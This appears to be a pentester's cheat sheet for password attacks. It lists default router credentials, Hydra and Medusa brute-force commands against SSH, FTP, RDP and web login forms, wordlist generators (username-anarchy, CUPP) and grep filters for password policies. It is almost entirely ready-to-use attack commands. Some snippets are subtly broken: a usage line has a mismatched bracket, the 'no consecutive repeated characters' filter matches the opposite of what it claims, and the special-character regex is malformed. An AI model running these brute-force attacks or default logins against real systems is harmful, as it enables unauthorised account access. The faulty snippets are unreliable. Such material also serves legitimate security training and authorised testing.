## Default Credentials
Linksys Router = admin:admin 
Netgear Router = admin:password
TP-Link Router = admin:admin 
Cisco Router = cisco:cisco
Ubiquiti UniFi AP = ubnt:ubnt

## Hydra
```
hydra [-l login] | -L file] [-p PASS | -P file] [-C file] -m MODULE [service://server[:PORT][/OPT]]
hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100
hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100
hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

## Medusa
```
medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5
medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp
medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f
```

## Custom Wordlists
```
username-anarchy Jane Smith
username-anarchy -i names.txt
username-anarchy -a --country us
username-anarchy -l
username-anarchy -f format1,format2
username-anarchy -@ example.com
username-anarchy --case-insensitive
```

## CUPP (Common User Passwords Profiler)
```
cupp -i
cupp -w profiles.txt
cupp -l
```

## Password Policy Filtering

**Minimum Length (8)
```
grep -E '^.{8,}$' wordlist.txt
```

**At least one uppercase
```
grep -E '[A-Z]' wordlist.txt
```

**At least lower uppercase
```
grep -E '[a-z]' wordlist.txt
```

**At least one digit
```
grep -E '[0-9]' wordlist.txt
```

**At least one special character
```
grep -E '[!@#$%^&*()_+-=[]{};':"\,.<>/?]' wordlist.txt
```

**No Consecutive Repeated Characters
```
grep -E '(.)\1' wordlist.txt
```

**Exclude Common Patterns (e.g., "password")
```
grep -v -i 'password' wordlist.txt
```

**Exclude Dictionary Words
```
grep -v -f dictionary.txt wordlist.txt
```

**Combination of Requirements
```
grep -E '^.{8,}$' wordlist.txt | grep -E '[A-Z]'
```
